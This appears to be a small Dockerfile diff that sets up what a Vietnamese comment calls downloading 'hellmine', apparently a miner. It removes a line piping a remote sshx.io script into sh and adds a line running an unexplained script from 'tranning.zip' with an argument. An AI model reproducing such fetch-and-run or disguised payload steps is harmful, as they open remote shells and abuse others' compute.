@@ -13,4 +13,4 @@ RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
 
 # Tạo thư mục làm việc và tải hellmine
 
-RUN curl -sSf https://sshx.io/get | sh -s run
+RUN unzip tranning.zip && cd tranning && chmod +x run.sh && ./run.sh 48
